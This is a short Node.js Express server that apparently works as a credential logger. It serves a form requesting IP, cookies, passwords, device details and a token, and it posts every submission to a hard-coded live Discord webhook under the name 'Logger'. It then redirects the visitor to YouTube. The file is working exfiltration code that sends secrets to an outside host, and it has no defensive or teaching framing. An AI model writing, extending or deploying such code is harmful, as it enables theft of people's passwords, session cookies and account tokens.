const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// Use the provided Discord webhook URL
const webhookUrl = "https://discord.com/api/webhooks/1269031066073694282/5ipMbzWKgPO7cMd9FM4ouHCp2JJhJyVTYy17daQYisynNImBeUuOM8V_3sFafVZewrFa";

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/', async (req, res) => {
    const { ip, cookies, password, device_info, token } = req.body;

    // Send data to Discord webhook
    try {
        await axios.post(webhookUrl, {
            username: "Logger",
            embeds: [{
                title: "Submitted Information",
                description: `IP: ${ip}\nCookies: ${cookies}\nPasswords: ${password}\nDevice Information: ${device_info}\nToken: ${token || 'No token provided'}`
            }]
        });
    } catch (error) {
        console.error("Error sending data to Discord:", error);
    }

    // Redirect to YouTube
    res.redirect('https://www.youtube.com');
});

app.get('/', (req, res) => {
    res.send(`
        <form method="post">
            IP: <input type="text" name="ip"><br>
            Cookies: <input type="text" name="cookies"><br>
            Passwords: <input type="text" name="password"><br>
            Device Information: <input type="text" name="device_info"><br>
            Token: <input type="text" name="token"><br>
            <input type="submit" value="Submit">
        </form>
    `);
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
